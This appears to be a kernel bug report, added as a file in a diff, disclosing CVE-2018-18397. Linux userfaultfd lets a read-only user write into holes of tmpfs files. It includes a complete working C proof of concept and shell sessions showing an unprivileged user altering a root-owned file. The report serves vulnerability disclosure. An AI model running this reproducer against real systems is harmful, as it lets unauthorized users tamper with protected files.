@@ -1,0 +1,149 @@
+Using the userfaultfd API, it is possible to first register a
+userfaultfd region for any VMA that fulfills vma_can_userfault():
+It must be an anonymous VMA (->vm_ops==NULL), a hugetlb VMA
+(VM_HUGETLB), or a shmem VMA (->vm_ops==shmem_vm_ops). This means that
+it is, for example, possible to register userfaulfd regions for shared
+readonly mappings of tmpfs files.
+
+Afterwards, the userfaultfd API can be used on such a region to
+(atomically) write data into holes in the file's mapping. This API
+also works on readonly shared mappings.
+
+This means that an attacker with read-only access to a tmpfs file that
+contains holes can write data into holes in the file.
+
+Reproducer:
+
+First, as root:
+=====================
+root@debian:~# cd /dev/shm
+root@debian:/dev/shm# umask 0022
+root@debian:/dev/shm# touch uffd_test
+root@debian:/dev/shm# truncate --size=4096 uffd_test
+root@debian:/dev/shm# ls -l uffd_test
+-rw-r--r-- 1 root root 4096 Oct 16 19:25 uffd_test
+root@debian:/dev/shm# hexdump -C uffd_test
+00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+root@debian:/dev/shm# 
+=====================
+
+Then, as a user (who has read access, but not write access, to that
+file):
+=====================
+user@debian:~/uffd$ cat uffd_demo.c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/userfaultfd.h>
+#include <err.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <stdio.h>
+
+static int uffd;
+static void *uf_mapping;
+
+int main(int argc, char **argv) {
+        int rw_open_res = open("/dev/shm/uffd_test", O_RDWR);
+        if (rw_open_res == -1)
+                perror("can't open for writing as expected");
+        else
+                errx(1, "unexpected write open success");
+
+        int mfd = open("/dev/shm/uffd_test", O_RDONLY);
+        if (mfd == -1) err(1, "tmpfs open");
+        uf_mapping = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, mfd, 0);
+        if (uf_mapping == (void*)-1) err(1, "shmat");
+
+        // Documentation for userfaultfd:
+        // http://man7.org/linux/man-pages/man2/userfaultfd.2.html
+        // http://man7.org/linux/man-pages/man2/ioctl_userfaultfd.2.html
+        // https://blog.lizzie.io/using-userfaultfd.html
+        uffd = syscall(__NR_userfaultfd, 0);
+        if (uffd == -1) err(1, "userfaultfd");
+        struct uffdio_api api = { .api = 0xAA, .features = 0 };
+        if (ioctl(uffd, UFFDIO_API, &api)) err(1, "API");
+
+        struct uffdio_register reg = {
+                .range = {
+                        .start = (unsigned long)uf_mapping,
+                        .len = 0x1000
+                },
+                .mode = UFFDIO_REGISTER_MODE_MISSING
+        };
+        if (ioctl(uffd, UFFDIO_REGISTER, &reg)) err(1, "REGISTER");
+
+        char buf[0x1000] = {'A', 'A', 'A', 'A'};
+        struct uffdio_copy copy = {
+                .dst = (unsigned long)uf_mapping,
+                .src = (unsigned long)buf,
+                .len = 0x1000,
+                .mode = 0
+        };
+        if (ioctl(uffd, UFFDIO_COPY, &copy)) err(1, "copy");
+        if (copy.copy != 0x1000) errx(1, "copy len");
+
+        printf("x: 0x%08x\n", *(unsigned int*)uf_mapping);
+        return 0;
+}
+user@debian:~/uffd$ gcc -o uffd_demo uffd_demo.c -Wall
+user@debian:~/uffd$ ./uffd_demo
+can't open for writing as expected: Permission denied
+x: 0x41414141
+user@debian:~/uffd$ 
+=====================
+
+And now again as root:
+=====================
+root@debian:/dev/shm# hexdump -C uffd_test
+00000000  41 41 41 41 00 00 00 00  00 00 00 00 00 00 00 00  |AAAA............|
+00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+=====================
+
+
+I asked MITRE for a CVE when I started writing the bug report, and
+they've already given me CVE-2018-18397.
+
+
+By the way, another interesting thing: Apparently userfaultfd even
+lets you write beyond the end of the file, and the writes become
+visible if the file is subsequently truncated to a bigger size?
+That seems wrong.
+
+As root, create an empty file:
+=====================
+root@debian:/dev/shm# rm uffd_test
+root@debian:/dev/shm# touch uffd_test
+root@debian:/dev/shm# ls -l uffd_test
+-rw-r--r-- 1 root root 0 Oct 16 19:44 uffd_test
+root@debian:/dev/shm# 
+=====================
+
+Now as a user, use userfaultfd to write into it:
+=====================
+user@debian:~/uffd$ ./uffd_demo
+can't open for writing as expected: Permission denied
+x: 0x41414141
+user@debian:~/uffd$ 
+=====================
+
+Afterwards, to root, the file still looks empty, until it is truncated
+to a bigger size:
+=====================
+root@debian:/dev/shm# ls -l uffd_test
+-rw-r--r-- 1 root root 0 Oct 16 19:44 uffd_test
+root@debian:/dev/shm# hexdump -C uffd_test
+root@debian:/dev/shm# truncate --size=4096 uffd_test
+root@debian:/dev/shm# hexdump -C uffd_test
+00000000  41 41 41 41 00 00 00 00  00 00 00 00 00 00 00 00  |AAAA............|
+00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00001000
+root@debian:/dev/shm# 
+=====================
